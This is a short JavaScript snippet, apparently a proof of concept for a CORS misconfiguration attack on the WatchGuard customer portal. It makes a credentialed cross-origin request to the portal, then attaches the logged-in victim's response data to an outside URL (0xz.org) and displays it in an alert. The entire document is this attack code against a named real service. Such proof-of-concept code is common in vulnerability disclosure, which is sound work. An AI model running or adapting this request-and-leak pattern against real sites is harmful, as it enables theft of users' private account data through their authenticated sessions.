var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://portal.watchguard.com/CustomerCommunityHome',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    alert('//0xz.org/vvvv.js?key='+this.responseText); 
};
